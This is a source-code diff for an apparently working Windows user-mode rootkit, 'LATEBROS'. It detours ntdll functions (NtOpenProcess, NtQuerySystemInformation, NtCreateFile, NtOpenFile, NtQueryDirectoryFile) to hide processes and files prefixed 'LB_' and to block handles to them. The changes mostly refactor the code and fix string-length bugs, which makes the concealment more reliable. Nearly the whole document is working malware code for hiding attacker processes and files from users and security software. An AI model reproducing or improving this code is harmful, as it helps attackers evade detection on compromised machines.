@@ -1,7 +1,8 @@
 ﻿#include "stdafx.h"
 #include "detour.hpp"
 #include <fstream>
-#define ROOTKIT_PREFIX L"LB_"
+
+constexpr static auto ROOTKIT_PREFIX = L"LB_";
 
 /*
  * Function: ntdll!NtOpenProcess
@@ -10,9 +11,9 @@
  */
 typedef NTSTATUS(NTAPI *NtOpenProcess_t)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, _CLIENT_ID* ClientId);
 extern "C" char __declspec(dllexport) ntop_og[0xF] = {}; // ORIGINAL BYTES
-extern "C" NTSTATUS __declspec(dllexport) NTAPI ntop(PHANDLE out_handle, ACCESS_MASK desired_access, POBJECT_ATTRIBUTES object_attributes, _CLIENT_ID* client_id)
+extern "C" NTSTATUS __declspec(dllexport) NTAPI ntop(PHANDLE out_handle, ACCESS_MASK, POBJECT_ATTRIBUTES object_attributes, _CLIENT_ID* client_id)
 {
-	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess"));
+	const auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess"));
 
 	// RESTORE
 	detour::remove_detour(function_pointer, ntop_og, sizeof(ntop_og));
@@ -23,16 +24,21 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntop(PHANDLE out_handle, ACCESS_
 	// REHOOK
 	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntop));
 
-	wchar_t name_buffer[MAX_PATH] = {};
-	if (GetModuleBaseNameW(*out_handle, nullptr, name_buffer, MAX_PATH))
+	std::wstring name_buffer;
+	name_buffer.resize(MAX_PATH);
+	const auto len = GetModuleBaseNameW(*out_handle, nullptr, name_buffer.data(), MAX_PATH);
+	if (len)
 	{
+		name_buffer.resize(len);
 		// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
-		std::wstring name = name_buffer;
-		if (name.find(ROOTKIT_PREFIX) != std::wstring::npos)
+		if (name_buffer.find(ROOTKIT_PREFIX) != std::wstring::npos)
 		{
-			CloseHandle(*out_handle);		// CLOSE HANDLE TO ENSURE IT WON'T BE USED REGARDLESS OF SANITY CHECKS
-			*out_handle = 0;				// ERASE PASSED HANLDE
-			return ERROR_INVALID_PARAMETER; // RETURN INVALID CLIENT_ID
+			if(*out_handle)
+				CloseHandle(*out_handle);		// CLOSE HANDLE TO ENSURE IT WON'T BE USED REGARDLESS OF SANITY CHECKS
+
+			// INVALID_HANDLE_VALUE shouldn't cause problems with CloseHandle
+			*out_handle = INVALID_HANDLE_VALUE;	// ERASE PASSED HANLDE
+			return ERROR_INVALID_PARAMETER;		// RETURN INVALID CLIENT_ID
 		}
 	}
 
@@ -64,33 +70,37 @@ extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS sy
 	// PREVENT BRUTEFORCE
 	if (system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x58)/*SystemProcessIdInformation*/)
 	{
-		auto process_id = *reinterpret_cast<uint64_t*>(system_information);
+		const auto process_id = *reinterpret_cast<uint64_t*>(system_information);
 
 		// REMOVE HOOKS IN CASE PROCESS ID IS PROTECTED
-		auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess"));
+		const auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess"));
 
 		// RESTORE
 		detour::remove_detour(function_pointer, ntop_og, sizeof(ntop_og));
 
 		// CALL
-		auto handle = OpenProcess(PROCESS_ALL_ACCESS, false, static_cast<DWORD>(process_id));
+		const auto handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, static_cast<DWORD>(process_id));
 
 		// REHOOK
 		detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntop));
 
-		wchar_t name_buffer[MAX_PATH] = {};
-		if (handle && GetModuleBaseNameW(handle, nullptr, name_buffer, MAX_PATH))
-		{
-			// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
-			std::wstring name = name_buffer;
-			if (name.find(ROOTKIT_PREFIX) != std::wstring::npos)
-				return STATUS_INVALID_CID; // RETURN INVALID CLIENT_ID
-		}
+		if (handle) {
+			std::wstring name_buffer;
+			name_buffer.resize(MAX_PATH);
+			const auto len = GetModuleBaseNameW(handle, nullptr, name_buffer.data(), MAX_PATH);
+			if (len)
+			{
+				name_buffer.resize(len);
+				// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
+				if (name_buffer.find(ROOTKIT_PREFIX) != std::wstring::npos)
+					return STATUS_INVALID_CID; // RETURN INVALID CLIENT_ID
+			}
 
-		CloseHandle(handle); // CLOSE HANDLE TO ENSURE IT WON'T BE USED REGARDLESS OF SANITY CHECKS
+			CloseHandle(handle);
+		}
 	}
 
-	auto function_pointer = reinterpret_cast<uintptr_t>(NtQuerySystemInformation);
+	const auto function_pointer = reinterpret_cast<uintptr_t>(NtQuerySystemInformation);
 
 	// RESTORE
 	detour::remove_detour(function_pointer, qsi_og, sizeof(qsi_og));
@@ -118,7 +128,7 @@ extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS sy
 			if (entry->ImageName.Buffer)
 			{
 				// SKIP PROTECTED ENTRIES
-				std::wstring name = entry->ImageName.Buffer;
+				std::wstring name(entry->ImageName.Buffer, entry->ImageName.Length / sizeof(wchar_t));
 				if (name.find(ROOTKIT_PREFIX) != std::wstring::npos)
 				{
 					previous_entry->NextEntryOffset += entry->NextEntryOffset;	// MAKE PREVIOUS ENTRY POINT TO THE NEXT ENTRY
@@ -148,19 +158,21 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntcr(
 {
 	if (object_attributes && object_attributes->ObjectName && object_attributes->ObjectName->Buffer)
 	{
-		std::wstring file_name = object_attributes->ObjectName->Buffer;
+		// UNICODE_STRING is not null terminated
+		std::wstring file_name(object_attributes->ObjectName->Buffer, object_attributes->ObjectName->Length / sizeof(wchar_t));
 
 		if (file_name.find(ROOTKIT_PREFIX) != std::wstring::npos)
 			return STATUS_NOT_FOUND;
 	}
 
-	auto function_pointer = reinterpret_cast<uintptr_t>(NtCreateFile);
+	const auto function_pointer = reinterpret_cast<uintptr_t>(NtCreateFile);
 
 	// RESTORE
 	detour::remove_detour(function_pointer, ntcr_og, sizeof(ntcr_og));
 
 	// CALL
-	auto result = NtCreateFile(file_handle, desired_access, object_attributes, io_status_block, allocation_size, file_attributes, share_access, create_disposition,	create_options, ea_buffer, ea_length);
+	const auto result = NtCreateFile(file_handle, desired_access, object_attributes, io_status_block, allocation_size,
+		file_attributes, share_access, create_disposition, create_options, ea_buffer, ea_length);
 
 	// REHOOK
 	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntcr));
@@ -178,19 +190,20 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntopf(PHANDLE file_handle, ACCES
 {
 	if (object_attributes && object_attributes->ObjectName && object_attributes->ObjectName->Buffer)
 	{
-		std::wstring file_name = object_attributes->ObjectName->Buffer;
+		// UNICODE_STRING is not null terminated
+		std::wstring file_name(object_attributes->ObjectName->Buffer, object_attributes->ObjectName->Length / sizeof(wchar_t));
 
 		if (file_name.find(ROOTKIT_PREFIX) != std::wstring::npos)
 			return STATUS_NOT_FOUND;
 	}
 
-	auto function_pointer = reinterpret_cast<uintptr_t>(NtOpenFile);
+	const auto function_pointer = reinterpret_cast<uintptr_t>(NtOpenFile);
 
 	// RESTORE
 	detour::remove_detour(function_pointer, ntopf_og, sizeof(ntopf_og));
 
 	// CALL
-	auto result = NtOpenFile(file_handle, desired_access, object_attributes, io_status_block, share_access, open_options);
+	const auto result = NtOpenFile(file_handle, desired_access, object_attributes, io_status_block, share_access, open_options);
 
 	// REHOOK
 	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntopf));
@@ -213,13 +226,14 @@ typedef NTSTATUS(NTAPI *NtQueryDirectoryFile_t)(HANDLE file_handle, HANDLE event
 extern "C" char __declspec(dllexport) ntqdf_og[0xF] = {}; // ORIGINAL BYTES
 extern "C" NTSTATUS __declspec(dllexport) NTAPI ntqdf(HANDLE file_handle, HANDLE event, PIO_APC_ROUTINE apc_routine, PVOID apc_context, PIO_STATUS_BLOCK io_status_block, PVOID file_information, ULONG length, FILE_INFORMATION_CLASS file_information_class, BOOLEAN return_single_entry, PUNICODE_STRING file_name, BOOLEAN restart_scan)
 {
-	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryDirectoryFile"));
+	const auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryDirectoryFile"));
 
 	// RESTORE
 	detour::remove_detour(function_pointer, ntqdf_og, sizeof(ntqdf_og));
 
 	// CALL	
-	auto result = reinterpret_cast<NtQueryDirectoryFile_t>(function_pointer)(file_handle, event, apc_routine, apc_context, io_status_block, file_information, length, file_information_class, return_single_entry, file_name, restart_scan);
+	const auto result = reinterpret_cast<NtQueryDirectoryFile_t>(function_pointer)(file_handle, event, apc_routine, apc_context, io_status_block, file_information, 
+		length, file_information_class, return_single_entry, file_name, restart_scan);
 
 	// REHOOK
 	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntqdf));
@@ -236,7 +250,7 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntqdf(HANDLE file_handle, HANDLE
 
 			while (current_entry->next_entry_offset)
 			{
-				std::wstring file_name = current_entry->file_name;
+				const std::wstring file_name = current_entry->file_name;
 				if (file_name.find(ROOTKIT_PREFIX) != std::wstring::npos)
 				{
 					previous_entry->next_entry_offset += current_entry->next_entry_offset;	// SKIP
